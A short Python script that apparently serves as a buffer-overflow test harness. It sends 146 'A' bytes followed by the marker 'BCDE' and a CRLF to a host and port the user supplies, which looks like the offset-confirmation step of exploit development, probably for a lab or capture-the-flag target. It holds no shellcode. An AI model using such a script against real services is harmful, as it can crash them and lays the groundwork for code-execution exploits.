#!/usr/bin/env python3

import sys, socket

host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user

filler = 'A'*146 + 'BCDE' + '\r\n' # Testing shows you need \r\n to send

try:
	print("Sending buffer..")
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
	client.connect((host, port)) # Connect to user supplied port and IP address	
	client.send(filler.encode('latin-1'))
	print(client.recv(1024))

except:
	print("Cannot connect!")
	sys.exit(0)

client.close()
